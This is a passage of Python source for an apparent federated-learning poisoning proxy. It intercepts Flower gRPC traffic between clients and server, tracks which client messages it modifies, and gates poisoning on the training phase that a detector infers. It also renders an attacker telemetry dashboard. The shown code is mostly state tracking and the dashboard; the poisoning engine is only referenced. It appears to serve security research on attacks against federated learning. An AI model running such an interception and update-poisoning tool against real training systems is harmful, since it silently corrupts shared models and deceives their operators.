        "evaluation": "LOCAL_EVALUATION",
        "local_evaluation": "LOCAL_EVALUATION",

        "modelup": "MODEL_UPLOAD",
        "model_up": "MODEL_UPLOAD",
        "upload": "MODEL_UPLOAD",
        "client_to_server": "MODEL_UPLOAD",
        "uplink": "MODEL_UPLOAD",
        "update_upload": "MODEL_UPLOAD",

        "aggregate": "SERVER_AGGREGATION",
        "aggregation": "SERVER_AGGREGATION",
        "server_aggregation": "SERVER_AGGREGATION",

        "learning": "LEARNING",
        "inference": "INFERENCE",
        "idle": "IDLE",
        "waiting": "IDLE",
        "unknown": "UNKNOWN",
    }
    return aliases.get(compact, compact.upper())


def _nested_dict(payload: dict, *keys: str) -> dict:
    for key in keys:
        value = payload.get(key)
        if isinstance(value, dict):
            return value
    return {}


class AttackerDashboardState:
    """Thread-safe attacker-observable experiment state.

    This state is owned by the interception proxy. It does not read Flower
    server metrics, client training metrics, or defense logs.
    """

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.lock = threading.RLock()
        self.started_at = time.time()
        self.status = "initializing"
        self.status_detail = ""
        self.dashboard_url = ""
        self.endpoint = {}
        self.network = {}
        self.connections: Dict[str, dict] = {}
        self.recent_events = deque(maxlen=250)
        self.sniffer_metadata = {}
        self.sniffer_metadata_at = 0.0
        self.current_phase_started_at = 0.0
        self.phase_history = deque(maxlen=120)
        self.client_phase_state: Dict[str, dict] = {}
        self.preexisting_flows: List[str] = []
        self.engine_state = {}
        self.final_summary_path = ""
        self._last_rate_time = time.time()
        self._last_rate_bytes = 0
        self._current_rate_Bps = 0.0

    def set_status(self, status: str, detail: str = "") -> None:
        with self.lock:
            self.status = str(status)
            self.status_detail = str(detail or "")

    def set_dashboard_url(self, url: str) -> None:
        with self.lock:
            self.dashboard_url = str(url)

    def set_network(self, **kwargs) -> None:
        with self.lock:
            self.network.update({k: _json_safe(v) for k, v in kwargs.items()})

    def set_endpoint(self, endpoint) -> None:
        if endpoint is None:
            return
        with self.lock:
            self.endpoint = {
                "ip": str(getattr(endpoint, "ip", "")),
                "port": int(getattr(endpoint, "port", 0) or 0),
                "source": str(getattr(endpoint, "source", "")),
            }

    def set_preexisting_flows(self, flows: List[str]) -> None:
        with self.lock:
            self.preexisting_flows = [str(row) for row in flows]

    def update_sniffer_metadata(self, payload: dict) -> None:
        """Accept server announcements and live phase-detector predictions.

        Supported phase packets may include any of:
          phase/decision_phase/current_fl_state/fl_phase/state/predicted_phase
          round/round_id/current_round
          confidence/decision_confidence/phase_confidence/posterior/probability
          client_ip/client/client_id/target_client/source_client_ip
          ttl_s/ttl/trigger_ttl_s for explicit analyzer decision lifetime

        Nested prediction/result/metadata dictionaries are also accepted.
        """
        if not isinstance(payload, dict):
            return

        nested = _nested_dict(payload, "prediction", "result", "metadata", "data")

        raw_phase = (
            payload.get("phase")
            or payload.get("decision_phase")
            or payload.get("current_fl_state")
            or payload.get("fl_phase")
            or payload.get("predicted_phase")
            or nested.get("phase")
            or nested.get("decision_phase")
            or nested.get("predicted_phase")
            or nested.get("state")
        )

        # Accept explicit analyzer upload signals as equivalent to MODEL_UPLOAD.
        command_value = str(
            payload.get("command")
            or payload.get("type")
            or nested.get("command")
            or nested.get("type")
            or ""
        ).strip().lower()
        upload_signal = (
            bool(payload.get("upload_signal"))
            or bool(nested.get("upload_signal"))
            or command_value in {
                "upload_signal",
                "model_upload",
                "modelup",
                "model_up",
                "upload",
                "update_upload",
                "apply_poison",
                "poison_trigger",
            }
        )
        if upload_signal:
            raw_phase = "MODEL_UPLOAD"

        normalized_phase = _normalize_fl_phase(raw_phase)

        round_value = (
            payload.get("round")
            or payload.get("round_id")
            or payload.get("current_round")
            or nested.get("round")
            or nested.get("round_id")
        )
        confidence = (
            payload.get("confidence")
            or payload.get("decision_confidence")
            or payload.get("phase_confidence")
            or payload.get("posterior")
            or payload.get("probability")
            or nested.get("confidence")
            or nested.get("decision_confidence")
            or nested.get("posterior")
            or nested.get("probability")
        )
        client_ip = str(
            payload.get("client_ip")
            or payload.get("target_client")
            or payload.get("client_id")
            or payload.get("client")
            or payload.get("source_client_ip")
            or nested.get("client_ip")
            or nested.get("target_client")
            or nested.get("client_id")
            or ""
        ).strip()
        source = str(
            payload.get("phase_source")
            or payload.get("source")
            or payload.get("module")
            or payload.get("command")
            or payload.get("type")
            or nested.get("source")
            or "metadata_feed"
        ).strip()

        interesting = {
            "phase": normalized_phase if raw_phase not in (None, "") else None,
            "raw_phase": raw_phase,
            "round": round_value,
            "confidence": confidence,
            "phase_source": source,
            "client_ip": client_ip,
            "window_id": (
                payload.get("window_id")
                or payload.get("instance_id")
                or nested.get("window_id")
            ),
            "ttl_s": (
                payload.get("ttl_s")
                or payload.get("ttl")
                or payload.get("trigger_ttl_s")
                or nested.get("ttl_s")
                or nested.get("ttl")
                or nested.get("trigger_ttl_s")
            ),
            "command": payload.get("command") or payload.get("type"),
            "server_ip": (
                payload.get("server_ip")
                or payload.get("fl_server_ip")
                or payload.get("target_server_ip")
            ),
            "server_port": (
                payload.get("server_port")
                or payload.get("fl_port")
                or payload.get("target_port")
            ),
        }

        # Important: analyzer messages are treated as per-client PHASE/STATUS
        # observations, not as target-selection commands. The proxy will only
        # attack a client that is also present in the configured target list
        # (--poison-clients / interactive CSV, or ALL). This is necessary because
        # the analyzer may publish status for every participating client.
        explicit_poison_command = command_value in {"apply_poison", "poison_trigger"}
        if upload_signal and client_ip and explicit_poison_command:
            logger.info(
                "[ANALYZER-STATUS] client=%s phase=MODEL_UPLOAD ttl=%s round=%s source=%s",
                client_ip, interesting.get("ttl_s") or 8.0, round_value, source or command_value,
            )

        now = time.time()
        with self.lock:
            old_phase = str(self.sniffer_metadata.get("phase", "UNKNOWN"))
            phase_changed = (
                raw_phase not in (None, "")
                and normalized_phase != old_phase
            )

            for key, value in interesting.items():
                if value not in (None, ""):
                    self.sniffer_metadata[key] = _json_safe(value)

            self.sniffer_metadata_at = now

            if raw_phase not in (None, ""):
                if phase_changed or self.current_phase_started_at <= 0:
                    self.current_phase_started_at = now
                    transition = {
                        "time": now,
                        "phase": normalized_phase,
                        "raw_phase": str(raw_phase),
                        "round": _json_safe(round_value),
                        "confidence": _json_safe(confidence),
                        "client_ip": client_ip,
                        "source": source,
                    }
                    self.phase_history.append(transition)
                    self.recent_events.append({
                        "time": now,
                        "level": "PHASE",
                        "message": (
                            f"FL phase -> {normalized_phase}"
                            + (f" round={round_value}" if round_value not in (None, "") else "")
                            + (f" client={client_ip}" if client_ip else "")
                            + (f" confidence={confidence}" if confidence not in (None, "") else "")
                        ),
                    })

                if client_ip:
                    previous = self.client_phase_state.get(client_ip, {})
                    client_started = previous.get("started_at", now)
                    if previous.get("phase") != normalized_phase:
                        client_started = now
                    self.client_phase_state[client_ip] = {
                        "phase": normalized_phase,
                        "raw_phase": str(raw_phase),
                        "round": _json_safe(round_value),
                        "confidence": _json_safe(confidence),
                        "source": source,
                        "ttl_s": _json_safe(interesting.get("ttl_s", "")),
                        "updated_at": now,
                        "started_at": client_started,
                    }

    def add_event(self, level: str, message: str, created: Optional[float] = None) -> None:
        with self.lock:
            self.recent_events.append({
                "time": float(created if created is not None else time.time()),
                "level": str(level),
                "message": str(message),
            })

    @staticmethod
    def connection_key(stats) -> str:
        return f"{stats.client_ip}:{stats.client_port}"

    def register_connection(self, stats, target: bool) -> str:
        key = self.connection_key(stats)
        with self.lock:
            self.connections[key] = {
                "key": key,
                "stats": stats,
                "counters": None,
                "client_ip": stats.client_ip,
                "client_port": stats.client_port,
                "target": bool(target),
                "protocol": "detecting",
                "state": "active",
                "connected_at": time.time(),
                "closed_at": None,
            }
        return key

    def set_connection_protocol(self, stats, protocol: str) -> None:
        key = self.connection_key(stats)
        with self.lock:
            if key in self.connections:
                self.connections[key]["protocol"] = str(protocol)

    def attach_counters(self, stats, counters) -> None:
        if stats is None:
            return
        key = self.connection_key(stats)
        with self.lock:
            if key in self.connections:
                self.connections[key]["counters"] = counters

    def close_connection(self, stats) -> None:
        if stats is None:
            return
        key = self.connection_key(stats)
        with self.lock:
            if key in self.connections:
                self.connections[key]["state"] = "closed"
                self.connections[key]["closed_at"] = time.time()

    def update_engine(self, engine) -> None:
        """Best-effort extraction that does not depend on one engine version."""
        names = [
            "observed", "observed_blocks", "num_observed", "warmup_count",
            "poisoned", "poisoned_blocks", "num_poisoned",
            "envelope_ready", "ready", "window_size", "aggressiveness",
            "last_mean_cosine", "mean_cos_to_benign",
            "last_tensors_in_envelope", "tensors_in_envelope",
            "last_tensor_count", "tensor_count",
        ]
        result = {}
        for name in names:
            try:
                value = getattr(engine, name)
                if callable(value):
                    continue
                result[name] = _json_safe(value)
            except Exception:
                continue
        with self.lock:
            self.engine_state.update(result)
            self.engine_state["updated_at"] = time.time()

    def _counter_snapshot(self, counters) -> dict:
        if counters is None:
            return {
                "grpc_messages_seen": 0,
                "grpc_messages_modified": 0,
                "arrays_found": 0,
                "arrays_modified": 0,
                "compressed_messages_skipped": 0,
                "nonfloat_arrays_skipped": 0,
                "selected_messages_skipped": 0,
                "parse_errors": 0,
                "model_messages_found": 0,
                "phase_gate_open_messages": 0,
                "phase_gate_blocked_messages": 0,
                "global_model_matches": 0,
                "update_space_messages": 0,
                "warmup_observations": 0,
            }
        return {
            "grpc_messages_seen": int(getattr(counters, "grpc_messages_seen", 0)),
            "grpc_messages_modified": int(getattr(counters, "grpc_messages_modified", 0)),
            "arrays_found": int(getattr(counters, "arrays_found", 0)),
            "arrays_modified": int(getattr(counters, "arrays_modified", 0)),
            "compressed_messages_skipped": int(getattr(counters, "compressed_messages_skipped", 0)),
            "nonfloat_arrays_skipped": int(getattr(counters, "nonfloat_arrays_skipped", 0)),
            "selected_messages_skipped": int(getattr(counters, "selected_messages_skipped", 0)),
            "parse_errors": int(getattr(counters, "parse_errors", 0)),
            "model_messages_found": int(getattr(counters, "model_messages_found", 0)),
            "phase_gate_open_messages": int(getattr(counters, "phase_gate_open_messages", 0)),
            "phase_gate_blocked_messages": int(getattr(counters, "phase_gate_blocked_messages", 0)),
            "global_model_matches": int(getattr(counters, "global_model_matches", 0)),
            "update_space_messages": int(getattr(counters, "update_space_messages", 0)),
            "warmup_observations": int(getattr(counters, "warmup_observations", 0)),
        }

    def snapshot(self) -> dict:
        with self.lock:
            now = time.time()
            rows = []
            aggregate = {
                "active_connections": 0,
                "total_connections": len(self.connections),
                "target_connections": 0,
                "active_target_connections": 0,
                "client_to_server_bytes": 0,
                "server_to_client_bytes": 0,
                "total_bytes": 0,
                "grpc_messages_seen": 0,
                "grpc_messages_modified": 0,
                "target_grpc_messages_seen": 0,
                "target_grpc_messages_modified": 0,
                "arrays_found": 0,
                "arrays_modified": 0,
                "parse_errors": 0,
                "model_messages_found": 0,
                "phase_gate_open_messages": 0,
                "phase_gate_blocked_messages": 0,
                "global_model_matches": 0,
                "update_space_messages": 0,
                "warmup_observations": 0,
            }

            for record in self.connections.values():
                stats = record["stats"].snapshot()
                counters = self._counter_snapshot(record.get("counters"))
                target = bool(record.get("target"))
                active = record.get("state") == "active"

                if active:
                    aggregate["active_connections"] += 1
                if target:
                    aggregate["target_connections"] += 1
                    if active:
                        aggregate["active_target_connections"] += 1

                aggregate["client_to_server_bytes"] += int(stats["client_to_server_bytes"])
                aggregate["server_to_client_bytes"] += int(stats["server_to_client_bytes"])
                aggregate["total_bytes"] += int(stats["total_bytes"])
                aggregate["grpc_messages_seen"] += counters["grpc_messages_seen"]
                aggregate["grpc_messages_modified"] += counters["grpc_messages_modified"]
                aggregate["arrays_found"] += counters["arrays_found"]
                aggregate["arrays_modified"] += counters["arrays_modified"]
                aggregate["parse_errors"] += counters["parse_errors"]
                aggregate["model_messages_found"] += counters["model_messages_found"]
                aggregate["phase_gate_open_messages"] += counters["phase_gate_open_messages"]
                aggregate["phase_gate_blocked_messages"] += counters["phase_gate_blocked_messages"]
                aggregate["global_model_matches"] += counters["global_model_matches"]
                aggregate["update_space_messages"] += counters["update_space_messages"]
                aggregate["warmup_observations"] += counters["warmup_observations"]
                if target:
                    aggregate["target_grpc_messages_seen"] += counters["grpc_messages_seen"]
                    aggregate["target_grpc_messages_modified"] += counters["grpc_messages_modified"]

                client_phase = self.client_phase_state.get(
                    str(record["client_ip"]), {}
                )
                row = {
                    "key": record["key"],
                    "client_ip": record["client_ip"],
                    "client_port": record["client_port"],
                    "target": target,
                    "protocol": record.get("protocol", ""),
                    "state": record.get("state", ""),
                    "fl_phase": client_phase.get(
                        "phase",
                        self.sniffer_metadata.get("phase", "UNKNOWN"),
                    ),
                    "fl_round": client_phase.get(
                        "round",
                        self.sniffer_metadata.get("round", ""),
                    ),
                    "phase_confidence": client_phase.get(
                        "confidence",
                        self.sniffer_metadata.get("confidence", ""),
                    ),
                    "phase_age_s": (
                        max(0.0, now - float(client_phase.get("started_at", now)))
                        if client_phase
                        else (
                            max(0.0, now - self.current_phase_started_at)
                            if self.current_phase_started_at
                            else None
                        )
                    ),
                    "connected_at": record.get("connected_at"),
                    "closed_at": record.get("closed_at"),
                    **stats,
                    **counters,
                }
                rows.append(row)

            delta_t = max(now - self._last_rate_time, 1e-6)
            delta_b = aggregate["total_bytes"] - self._last_rate_bytes
            if delta_b >= 0:
                self._current_rate_Bps = delta_b / delta_t
            self._last_rate_time = now
            self._last_rate_bytes = aggregate["total_bytes"]
            aggregate["current_rate_Bps"] = self._current_rate_Bps

            seen = aggregate["target_grpc_messages_seen"]
            modified = aggregate["target_grpc_messages_modified"]
            warmup = max(0, int(getattr(self.args, "live_warmup", 0) or 0))
            live_poison = bool(getattr(self.args, "live_poison", False))
            attack_type = str(getattr(self.args, "live_attack", ""))

            if not live_poison:
                attack_phase = "disabled"
            elif seen == 0:
                attack_phase = "waiting_for_target_traffic"
            elif attack_type == "envelope" and modified == 0:
                attack_phase = "warmup"
            elif modified > 0:
                attack_phase = "active"
            else:
                attack_phase = "armed"

            engine_observed = _safe_number(self.engine_state.get("observed", 0), 0)
            engine_poisoned = _safe_number(self.engine_state.get("poisoned", 0), 0)
            benign_observed_estimate = (
                max(0, int(engine_observed))
                if attack_type == "envelope" and int(engine_observed) > 0
                else max(0, seen - modified)
            )
            warmup_progress = 1.0
            if attack_type == "envelope" and warmup > 0:
                warmup_progress = min(1.0, benign_observed_estimate / warmup)

            eligible_after_warmup = max(0, int(engine_observed) - warmup) if attack_type == "envelope" else max(0, seen - warmup)
            post_warmup_coverage = (
                modified / eligible_after_warmup
                if eligible_after_warmup > 0
                else 0.0
            )
            overall_modification_rate = modified / seen if seen else 0.0

            metadata_age = (
                max(0.0, now - self.sniffer_metadata_at)
                if self.sniffer_metadata_at
                else None
            )
            current_fl_phase = str(
                self.sniffer_metadata.get("phase", "UNKNOWN")
            )
            current_phase_age = (
                max(0.0, now - self.current_phase_started_at)
                if self.current_phase_started_at
                else None
            )
            phase_stale = (
                metadata_age is None
                or metadata_age > 10.0
            )

            configuration = {
                "interface": getattr(self.args, "interface", ""),
                "client_subnet": getattr(self.args, "client_subnet", ""),
                "proxy_port": getattr(self.args, "proxy_port", 0),
                "capture_enabled": bool(getattr(self.args, "capture_streams", False)),
                "capture_dir": getattr(self.args, "capture_dir", ""),
                "live_poison": live_poison,
                "attack_type": attack_type,
                "alpha": getattr(self.args, "live_alpha", ""),
                "sigma": getattr(self.args, "live_sigma", ""),
                "aggressiveness": getattr(self.args, "live_aggressiveness", ""),
                "raw_attack": getattr(self.args, "live_raw_attack", ""),
                "warmup": warmup,
                "window": getattr(self.args, "live_window", ""),
                "start_message": getattr(self.args, "live_start_message", 0),
                "end_message": getattr(self.args, "live_end_message", -1),
                "poison_targets": sorted(parse_csv_set(
                    getattr(self.args, "poison_clients", "")
                )) or ["ALL_INTERCEPTED_CLIENTS"],
                "phase_gate_enabled": bool(getattr(self.args, "phase_gate_enabled", True)),
                "phase_gate_min_confidence": getattr(self.args, "phase_gate_min_confidence", 0.85),
                "phase_gate_max_age_s": getattr(self.args, "phase_gate_max_age_s", 90.0),
                "phase_gate_ignore_age": bool(getattr(self.args, "phase_gate_ignore_age", False)),
                "phase_gate_require_client": bool(getattr(self.args, "phase_gate_require_client", True)),
                "require_update_space": bool(getattr(self.args, "require_update_space", True)),
                "global_model_max_age_s": getattr(self.args, "global_model_max_age_s", 600.0),
                "require_global_round_match": bool(getattr(self.args, "require_global_round_match", False)),
            }

            rows.sort(key=lambda row: (row["state"] != "active", row["client_ip"], row["client_port"]))

            return {
                "generated_at": now,
                "uptime_s": max(0.0, now - self.started_at),
                "status": self.status,
                "status_detail": self.status_detail,
                "dashboard_url": self.dashboard_url,
                "endpoint": dict(self.endpoint),
                "network": dict(self.network),
                "configuration": configuration,
                "attack": {
                    "phase": attack_phase,
                    "warmup_progress": warmup_progress,
                    "benign_observed_estimate": benign_observed_estimate,
                    "target_messages_seen": seen,
                    "target_messages_modified": modified,
                    "overall_modification_rate": overall_modification_rate,
                    "post_warmup_delivery_coverage": post_warmup_coverage,
                    "model_messages_found": aggregate["model_messages_found"],
                    "phase_gate_open_messages": aggregate["phase_gate_open_messages"],
                    "phase_gate_blocked_messages": aggregate["phase_gate_blocked_messages"],
                    "global_model_matches": aggregate["global_model_matches"],
                    "update_space_messages": aggregate["update_space_messages"],
                    "warmup_observations": aggregate["warmup_observations"],
                    "effectiveness_observable": False,
                    "effectiveness_note": (
                        "The attacker proxy can confirm delivery and traffic "
                        "coverage, but not global model degradation without an "
                        "external feedback channel."
                    ),
                },
                "aggregate": aggregate,
                "fl_phase": {
                    "current": current_fl_phase,
                    "raw": self.sniffer_metadata.get("raw_phase", ""),
                    "round": self.sniffer_metadata.get("round", ""),
                    "confidence": self.sniffer_metadata.get("confidence", ""),
                    "source": self.sniffer_metadata.get(
                        "phase_source",
                        self.sniffer_metadata.get("command", ""),
                    ),
                    "client_ip": self.sniffer_metadata.get("client_ip", ""),
                    "window_id": self.sniffer_metadata.get("window_id", ""),
                    "phase_age_s": current_phase_age,
                    "metadata_age_s": metadata_age,
                    "stale": phase_stale,
                    "history": list(self.phase_history)[-30:],
                    "per_client": {
                        client_ip: {
                            **dict(info),
                            "metadata_age_s": max(
                                0.0,
                                now - float(info.get("updated_at", now)),
                            ),
                            "phase_age_s": max(
                                0.0,
                                now - float(info.get("started_at", now)),
                            ),
                        }
                        for client_ip, info in self.client_phase_state.items()
                    },
                },
                "sniffer": {
                    **dict(self.sniffer_metadata),
                    "metadata_age_s": metadata_age,
                },
                "engine": dict(self.engine_state),
                "model_cache": (
                    get_model_cache(self.args).snapshot()
                    if bool(getattr(self.args, "live_poison", False)) else {}
                ),
                "preexisting_flows": list(self.preexisting_flows),
                "connections": rows,
                "recent_events": list(self.recent_events)[-100:],
                "final_summary_path": self.final_summary_path,
            }

    def write_final_summary(self) -> Optional[Path]:
        try:
            capture_dir = Path(str(getattr(self.args, "capture_dir", "") or "."))
            capture_dir.mkdir(parents=True, exist_ok=True)
            stamp = time.strftime("%Y%m%d_%H%M%S")
            path = capture_dir / f"attacker_dashboard_summary_{stamp}.json"
            payload = self.snapshot()
            payload["summary_type"] = "attacker_observable_final_state"
            path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
            with self.lock:
                self.final_summary_path = str(path.resolve())
            return path
        except Exception as exc:
            logger.warning("Could not write attacker dashboard summary: %s", exc)
            return None


def dashboard_update_metadata(payload: dict) -> None:
    state = _get_dashboard_state()
    if state is not None:
        state.update_sniffer_metadata(payload)


def dashboard_update_engine(engine) -> None:
    state = _get_dashboard_state()
    if state is None or engine is None:
        return
    try:
        snapshot = engine.snapshot() if hasattr(engine, "snapshot") else None
        if isinstance(snapshot, dict):
            with state.lock:
                state.engine_state.update(_json_safe(snapshot))
                state.engine_state["updated_at"] = time.time()
            return
    except Exception:
        pass
    state.update_engine(engine)


_ATTACKER_DASHBOARD_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FL Poison Proxy — Phase-Gated Update-Space Dashboard v24</title>
<style>
:root{--bg:#071018;--panel:#0d1a24;--panel2:#102330;--line:#203746;--text:#e8f2f7;--muted:#8fa8b6;--ok:#46d39a;--warn:#ffc857;--bad:#ff6b6b;--accent:#56b8ff;--violet:#b69cff}
*{box-sizing:border-box} body{margin:0;background:linear-gradient(145deg,#061018,#0a1620 60%,#071018);color:var(--text);font:14px/1.45 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif}
header{position:sticky;top:0;z-index:5;background:rgba(7,16,24,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);padding:16px 22px;display:flex;align-items:center;justify-content:space-between}
h1{font-size:18px;margin:0;letter-spacing:.02em}.sub{color:var(--muted);font-size:12px}.status{display:flex;gap:8px;align-items:center}.dot{width:10px;height:10px;border-radius:50%;background:var(--warn);box-shadow:0 0 12px currentColor}
main{max-width:1500px;margin:auto;padding:18px}.grid{display:grid;grid-template-columns:repeat(12,1fr);gap:14px}.card{background:linear-gradient(180deg,rgba(16,35,48,.96),rgba(13,26,36,.96));border:1px solid var(--line);border-radius:14px;padding:15px;box-shadow:0 12px 30px rgba(0,0,0,.16)}
.span2{grid-column:span 2}.span3{grid-column:span 3}.span4{grid-column:span 4}.span5{grid-column:span 5}.span6{grid-column:span 6}.span7{grid-column:span 7}.span8{grid-column:span 8}.span12{grid-column:span 12}
.label{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.1em}.value{font-size:28px;font-weight:700;margin-top:5px}.small{font-size:12px;color:var(--muted)}.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
.badge{display:inline-flex;align-items:center;padding:4px 8px;border-radius:999px;border:1px solid var(--line);background:#0a1720;font-size:12px}.ok{color:var(--ok)}.warn{color:var(--warn)}.bad{color:var(--bad)}.accent{color:var(--accent)}
.progress{height:8px;background:#08141c;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-top:9px}.bar{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--violet));transition:width .35s}
.kv{display:grid;grid-template-columns:minmax(120px,1fr) 2fr;gap:7px 12px;margin-top:10px}.kv div:nth-child(odd){color:var(--muted)}
table{width:100%;border-collapse:collapse;margin-top:10px;font-size:12px}th{text-align:left;color:var(--muted);font-weight:600;border-bottom:1px solid var(--line);padding:8px 6px}td{padding:8px 6px;border-bottom:1px solid rgba(32,55,70,.55);vertical-align:top}
.events{height:320px;overflow:auto;background:#07131b;border:1px solid var(--line);border-radius:10px;padding:8px}.event{padding:5px 7px;border-bottom:1px solid rgba(32,55,70,.35);font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px}.event .t{color:#698392}.event.WARNING,.event.ERROR,.event.CRITICAL{color:var(--warn)}
canvas{width:100%;height:170px;background:#07131b;border:1px solid var(--line);border-radius:10px;margin-top:10px}
.notice{border-left:3px solid var(--warn);padding:9px 11px;background:rgba(255,200,87,.07);border-radius:8px;margin-top:10px;color:#d8c796}
.phaseHero{display:flex;align-items:center;justify-content:space-between;gap:18px;min-height:120px}
.phaseName{font-size:34px;font-weight:800;letter-spacing:.02em}
.phaseMeta{display:grid;grid-template-columns:repeat(4,minmax(90px,1fr));gap:10px;width:58%}
.phaseMeta>div{background:#08141c;border:1px solid var(--line);border-radius:10px;padding:10px}
.timeline{display:flex;gap:8px;overflow:auto;padding:8px 0 2px}
.phaseStep{min-width:145px;background:#08141c;border:1px solid var(--line);border-radius:9px;padding:8px}
.phaseStep.active{border-color:var(--accent);box-shadow:0 0 0 1px rgba(86,184,255,.2)}
.phaseUnknown{color:var(--muted)}.phaseDownload{color:#56b8ff}.phaseTraining{color:#46d39a}.phaseEvaluation{color:#ffc857}.phaseUpload{color:#b69cff}.phaseAggregation{color:#ff8a65}
@media(max-width:1000px){.span2,.span3,.span4,.span5,.span6,.span7,.span8{grid-column:span 12}.grid{gap:10px}header{align-items:flex-start;gap:10px}}
</style>
</head>
<body>
<header>
  <div><h1>FL Poison Proxy — Phase-Gated Update-Space Dashboard v24</h1><div class="sub">Read-only, attacker-observable telemetry</div></div>
  <div class="status"><span class="dot" id="statusDot"></span><span id="statusText">connecting</span><span class="badge mono" id="uptime">0s</span></div>
</header>
<main>
<div class="grid">
  <section class="card span2"><div class="label">Attack phase</div><div class="value" id="attackPhase">—</div><div class="small" id="phaseHint">—</div></section>
  <section class="card span2"><div class="label">Target messages</div><div class="value" id="targetSeen">0</div><div class="small">gRPC messages observed</div></section>
  <section class="card span2"><div class="label">Modified</div><div class="value accent" id="targetModified">0</div><div class="small" id="modifiedRate">0%</div></section>
  <section class="card span2"><div class="label">Active sessions</div><div class="value" id="activeConnections">0</div><div class="small" id="targetConnections">0 target sessions</div></section>
  <section class="card span2"><div class="label">Live throughput</div><div class="value" id="throughput">0 B/s</div><div class="small" id="totalTraffic">0 B total</div></section>
  <section class="card span2"><div class="label">Parse health</div><div class="value" id="parseErrors">0</div><div class="small" id="bypassCount">0 preexisting bypass flows</div></section>

  <section class="card span12">
    <div class="label">Instantaneous federated-learning phase</div>
    <div class="phaseHero">
      <div>
        <div class="phaseName phaseUnknown" id="instantPhase">UNKNOWN</div>
        <div class="small" id="instantPhaseStatus">Waiting for phase-detector metadata</div>
      </div>
      <div class="phaseMeta">
        <div><div class="label">Round</div><div class="value" style="font-size:20px" id="instantRound">—</div></div>
        <div><div class="label">Confidence</div><div class="value" style="font-size:20px" id="instantConfidence">—</div></div>
        <div><div class="label">Phase duration</div><div class="value" style="font-size:20px" id="instantPhaseAge">—</div></div>
        <div><div class="label">Detector source</div><div class="value mono" style="font-size:14px" id="instantPhaseSource">—</div></div>
      </div>
    </div>
    <div class="timeline" id="phaseTimeline">
      <div class="phaseStep"><div class="small">No phase transitions received yet.</div></div>
    </div>
  </section>

  <section class="card span4">
    <div class="label">Attack delivery</div>
    <div class="kv">
      <div>Warm-up progress</div><div id="warmupText">—</div>
      <div>Post-warmup coverage</div><div id="coverageText">—</div>
      <div>Attack type</div><div class="mono" id="attackType">—</div>
      <div>Targets</div><div class="mono" id="targets">—</div>
      <div>Aggressiveness</div><div id="aggressiveness">—</div>
      <div>Model messages</div><div id="modelMessages">0</div>
      <div>Phase gate open</div><div id="phaseGateOpen">0</div>
      <div>Global matches</div><div id="globalMatches">0</div>
      <div>Update-space used</div><div id="updateSpaceMessages">0</div>
    </div>
    <div class="progress"><div class="bar" id="warmupBar"></div></div>
    <div class="notice" id="effectivenessNote">Attack delivery is observable here; global model impact is not.</div>
  </section>

  <section class="card span4">
    <div class="label">Network and detector feed</div>
    <div class="kv">
      <div>Upstream server</div><div class="mono" id="endpoint">waiting</div>
      <div>Interceptor</div><div class="mono" id="interceptor">—</div>
      <div>Inferred FL phase</div><div id="snifferPhase">unknown</div>
      <div>Inferred round</div><div id="snifferRound">unknown</div>
      <div>Confidence</div><div id="snifferConfidence">unknown</div>
      <div>Metadata age</div><div id="metadataAge">—</div>
    </div>
  </section>

  <section class="card span4">
    <div class="label">Envelope engine</div>
    <div class="kv" id="engineKv"><div>Status</div><div>Waiting for engine activity</div></div>
  </section>

  <section class="card span7">
    <div class="label">Live attacker telemetry</div>
    <canvas id="chart" width="900" height="260"></canvas>
    <div class="small">Traffic rate and cumulative modified messages, sampled in this browser.</div>
  </section>

  <section class="card span5">
    <div class="label">Configuration</div>
    <div class="kv" id="configKv"></div>
  </section>

  <section class="card span12">
    <div class="label">Intercepted sessions</div>
    <div style="overflow:auto">
    <table>
      <thead><tr><th>Client</th><th>Target</th><th>Instant FL phase</th><th>Round</th><th>State</th><th>Protocol</th><th>Elapsed</th><th>C→S</th><th>S→C</th><th>gRPC</th><th>Modified</th><th>Parse errors</th></tr></thead>
      <tbody id="connectionsBody"><tr><td colspan="12" class="small">No intercepted sessions yet.</td></tr></tbody>
    </table>
    </div>
  </section>

  <section class="card span12">
    <div class="label">Recent proxy events</div>
    <div class="events" id="events"></div>
  </section>
</div>
</main>
<script>
const trafficSeries=[], modifiedSeries=[]; const MAX_POINTS=120;
function esc(v){return String(v??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#039;"}[m]));}
function fmtBytes(n){n=Number(n||0);const u=["B","KB","MB","GB","TB"];let i=0;while(n>=1024&&i<u.length-1){n/=1024;i++;}return `${n.toFixed(i?1:0)} ${u[i]}`;}
function fmtRate(n){return fmtBytes(n)+"/s";}
function fmtDur(s){s=Math.max(0,Number(s||0));const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),x=Math.floor(s%60);return h?`${h}h ${m}m ${x}s`:m?`${m}m ${x}s`:`${x}s`;}
function pct(v){return `${(Number(v||0)*100).toFixed(1)}%`;}
function setText(id,v){const e=document.getElementById(id);if(e)e.textContent=v;}
function phaseClass(p){
 p=String(p||"UNKNOWN").toUpperCase();
 if(p.includes("DOWNLOAD"))return "phaseDownload";
 if(p.includes("TRAIN"))return "phaseTraining";
 if(p.includes("EVALUAT"))return "phaseEvaluation";
 if(p.includes("UPLOAD"))return "phaseUpload";
 if(p.includes("AGGREGAT"))return "phaseAggregation";
 return "phaseUnknown";
}
function confidenceText(v){
 if(v===null||v===undefined||v==="")return "—";
 const n=Number(v); if(Number.isFinite(n))return n<=1?`${(n*100).toFixed(1)}%`:n.toFixed(2);
 return String(v);
}
function drawChart(){
 const c=document.getElementById("chart"),ctx=c.getContext("2d"),w=c.width,h=c.height;ctx.clearRect(0,0,w,h);
 ctx.strokeStyle="#203746";ctx.lineWidth=1;for(let i=1;i<5;i++){let y=i*h/5;ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(w,y);ctx.stroke();}
 const maxT=Math.max(1,...trafficSeries),maxM=Math.max(1,...modifiedSeries);
